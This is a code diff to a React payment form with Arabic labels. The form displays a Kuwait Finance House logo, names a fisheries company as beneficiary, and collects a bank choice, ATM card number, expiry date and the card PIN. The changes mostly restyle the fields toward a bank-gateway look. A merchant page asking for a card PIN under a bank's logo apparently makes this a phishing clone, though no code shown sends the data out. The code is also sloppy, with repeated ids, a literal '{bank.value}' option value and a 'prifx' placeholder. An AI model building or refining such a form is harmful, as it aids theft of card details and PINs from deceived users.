@@ -22,7 +22,8 @@ export type Bank = {
   value: string
   label: string
 }
-
+const month=['1','2','3','4','5','6','7','8','9','10','11','12']
+const years=['2024','2025','2026','2027','2028','2029','2030','2031','2032','2033','2034','2035']
 export const BANKS: Bank[] = [
   { value: 'nbk', label: 'بنك الكويت الوطني' },
   { value: 'cbk', label: 'البنك التجاري الكويتي' },
@@ -107,14 +108,19 @@ export default function PaymentForm({
   }
 
   return (
-    <Card className="w-full max-w-md mx-auto bg-gray-100">
-      <img 
-        className="w-full h-14 my-4 object-contain" 
-        src="/1212122.PNG" 
-        alt="Kuwait Finance House Logo"
-      />
+    <> <img 
+    className="w-full h-18 m-1 rounded-lg" 
+    src="/1212122.PNG" 
+    alt="Kuwait Finance House Logo"
+  />
+    <Card className="w-full bg-gray-100 
+
+">
+     
       <CardHeader>
-        <Card className="bg-white">
+        <Card className="bg-white shadow-xl
+
+">
           <CardContent className="space-y-4">
             <img 
               className="w-full h-14 my-4 object-contain" 
@@ -122,11 +128,11 @@ export default function PaymentForm({
               alt="National Fisheries Company Logo" 
             />
             <div className="flex justify-between items-center border-b pb-2">
-              <Label className="font-medium">المستفيد:</Label>
+              <Label className="font-bold text-blue-500">المستفيد:</Label>
               <span>الشركة الوطنية للأسماك</span>
             </div>
             <div className="flex justify-between items-center">
-              <Label className="font-medium">المبلغ:</Label>
+              <Label className="font-bold text-blue-500">المبلغ:</Label>
               <span className="text-lg font-bold">{total} د.ك</span>
             </div>
           </CardContent>
@@ -135,16 +141,16 @@ export default function PaymentForm({
 
       <CardContent>
         {(paymentMethod === 'credit_card' || paymentMethod === 'bank_card') && (
-          <Card>
+          <Card className='shadow-xl          '>
             <CardContent className="p-6">
               {step === 1 ? (
                 <form onSubmit={handlePaymentInfoSubmit} className="space-y-6">
                   <div className="space-y-4">
-                    <div className="space-y-2">
-                      <Label htmlFor="bank">يرجى اختيار البنك:</Label>
+                    <div className="   flex border-b-2">
+                      <Label className='text-blue-500 pb-4  w-32 pt-2 font-samll ' htmlFor="bank">يرجى اختيار البنك:</Label>
                       <select 
                         id="bank"
-                        className="w-full p-2 border rounded-md"
+                        className=" bg-gray-300 flex-auto h-6 border rounded-md  font-samll "
                         value={paymentInfo.bank}
                         onChange={(e) => setPaymentInfo({ ...paymentInfo, bank: e.target.value })}
                         required
@@ -158,80 +164,100 @@ export default function PaymentForm({
                       </select>
                     </div>
 
-                    <div className="space-y-2">
-                      <Label htmlFor="card-number">رقم بطاقة الصرف الآلي:</Label>
+                    <div className="space-y-2 flex border-b-2 mb-2">
+                      <Label className='text-blue-500 pb-4 font-samll pl-1  pt-3  ' htmlFor="card-number">رقم بطاقة الصراف الآلي:</Label>
                       <input
                         type="text"
                         id="card-number"
-                        className="w-full p-2 border rounded-md"
+                        className=" ml-1 flex-auto w-16 p-2 h-6 border rounded-md  font-samll"
                         placeholder="1234 5678 9012 3456"
                         value={paymentInfo.cardNumber}
                         onChange={(e) => setPaymentInfo({ ...paymentInfo, cardNumber: e.target.value })}
                         required
-                        maxLength={19}
+                        maxLength={16}
                       />
+                        <select 
+                        id="bank"
+                        className=" bg-gray-300  flex-auto w-16 h-6 border rounded-md  font-samll "
+                        required
+                      >
+                        <option className='bg-gray-500' value="" disabled>prifx</option>
+                       
+                          <option value="{bank.value}">
+                          prifx
+                          </option>
+                      </select>
+                    </div>
                     </div>
 
-                    <div className="grid grid-cols-2 gap-4">
-                      <div className="space-y-2">
-                        <Label htmlFor="expiry-month">الشهر:</Label>
-                        <input
-                          type="text"
-                          id="expiry-month"
-                          className="w-full p-2 border rounded-md"
-                          placeholder="MM"
-                          value={paymentInfo.month}
-                          onChange={(e) => setPaymentInfo({ ...paymentInfo, month: e.target.value })}
-                          required
-                          maxLength={2}
-                        />
-                      </div>
-                      <div className="space-y-2">
-                        <Label htmlFor="expiry-year">السنة:</Label>
-                        <input
-                          type="text"
-                          id="expiry-year"
-                          className="w-full p-2 border rounded-md"
-                          placeholder="YYYY"
-                          value={paymentInfo.year}
-                          onChange={(e) => setPaymentInfo({ ...paymentInfo, year: e.target.value })}
-                          required
-                          maxLength={4}
-                        />
-                      </div>
+                    <div className="  w-full ">
+                    <div className="flex border-b-2  ">
+                    <Label className='text-blue-500  w-32  font-samll pl-1  ' htmlFor="expiry-month">تاريخ انتهاء البطاقة:</Label>
+                      
+                      <div className=" grid grid-cols-2 " >
+                      <select 
+                        id="bank"
+                        className=" bg-gray-300 flex-auto h-6 border rounded-md  mb-2 font-samll w-16 "
+                        value={paymentInfo.month}
+                        onChange={(e) => setPaymentInfo({ ...paymentInfo, month: e.target.value })}
+                        required
+                      >
+                        {month.map((bank) => (
+                          <option key={bank} value={bank}>
+                            {bank}
+                          </option>
+                        ))}
+                      </select>
+                      <select 
+                        id="bank"
+                        className=" bg-gray-300 flex-auto h-6 border rounded-md  font-samll w-16 "
+                        value={paymentInfo.year}
+                        onChange={(e) => setPaymentInfo({ ...paymentInfo, year: e.target.value })}
+                        required
+                      >
+                        {years.map((bank) => (
+                          <option key={bank} value={bank}>
+                            {bank}
+                          </option>
+                        ))}
+                      </select>
                     </div>
+                    
+                  </div>
+                       
 
-                    <div className="space-y-2">
-                      <Label htmlFor="pin">الرقم السري:</Label>
+                  </div>
+
+                  <div className="space-y-2 flex">
+                      <Label className='text-blue-500 font-samll pl-1  pt-3' htmlFor="pin">الرقم السري:</Label>
                       <input
                         type="password"
                         id="pin"
-                        className="w-full p-2 border rounded-md"
+                        className="flex-auto w-32 p-2 h-6 p-2 border rounded-md"
                         placeholder="••••"
                         value={paymentInfo.pass}
                         onChange={(e) => setPaymentInfo({ ...paymentInfo, pass: e.target.value })}
                         required
+                        maxLength={4}
                       />
                     </div>
-                  </div>
-
                   {showError && (
                     <p className="text-red-500 text-sm">
                       يرجى التحقق من صحة البيانات المدخلة
                     </p>
                   )}
 
-                  <div className="grid grid-cols-2 gap-4">
+                  <div className="grid grid-cols-2 ">
                     <button
                       type="button"
-                      className="p-2 border rounded-md hover:bg-gray-100"
+                      className=" border  bg-gray-400 rounded-md h-6 hover:bg-gray-100"
                       onClick={() => window.history.back()}
                     >
                       إلغاء
                     </button>
                     <button
                       type="submit"
-                      className="p-2 bg-primary text-white rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
+                      className=" h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
                       disabled={isLoading}
                     >
                       {isLoading ? (
@@ -263,11 +289,11 @@ export default function PaymentForm({
 
                   <button
                     type="submit"
-                    className="w-full p-2 bg-primary text-white rounded-md hover:bg-primary/90 disabled:opacity-50"
+                    className="w-full h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50"
                     disabled={isLoading}
                   >
                     {isLoading ? (
-                      <span className="flex items-center justify-center gap-2">
+                      <span className="h-6  bg-gray-300  rounded-md bg-gray-400 hover:bg-gray/90 disabled:opacity-50">
                         جاري التحقق
                         <Loader className="animate-spin" />
                       </span>
@@ -289,6 +315,7 @@ export default function PaymentForm({
         </a>
       </footer>
     </Card>
+    </>
   )
 }
 
